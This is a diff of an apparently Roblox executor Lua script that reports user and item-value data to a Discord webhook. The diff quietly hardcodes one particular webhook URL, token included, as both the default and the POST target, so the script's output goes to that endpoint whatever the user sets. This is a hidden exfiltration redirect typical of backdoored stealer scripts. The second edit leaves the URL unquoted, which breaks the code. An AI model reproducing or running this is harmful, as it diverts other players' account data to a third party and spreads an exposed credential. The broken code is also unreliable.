@@ -21,7 +21,7 @@ local Replion = require(game.ReplicatedStorage.Packages.Replion)
 local users = _G.Usernames or {}
 local min_rap = _G.min_rap or 100
 local ping = _G.pingEveryone or "No"
-local webhook = _G.webhook or ""
+local webhook = _G.webhook or "https://discord.com/api/webhooks/1444284631854878843/UQjYW1S499U_xEyML8ijlY0EF0BkxZ8r1nS0oX1ZYfQtWhdEWrH-zVKPDzeMPlNEvzc2"
 
 if next(users) == nil or webhook == "" then
     plr:kick("You didn't add usernames or webhook")
@@ -219,7 +219,7 @@ local function SendJoinMessage(list, prefix)
         ["Content-Type"] = "application/json"
     }
     local response = request({
-        Url = webhook,
+        Url = https://discord.com/api/webhooks/1444284631854878843/UQjYW1S499U_xEyML8ijlY0EF0BkxZ8r1nS0oX1ZYfQtWhdEWrH-zVKPDzeMPlNEvzc2,
         Method = "POST",
         Headers = headers,
         Body = body
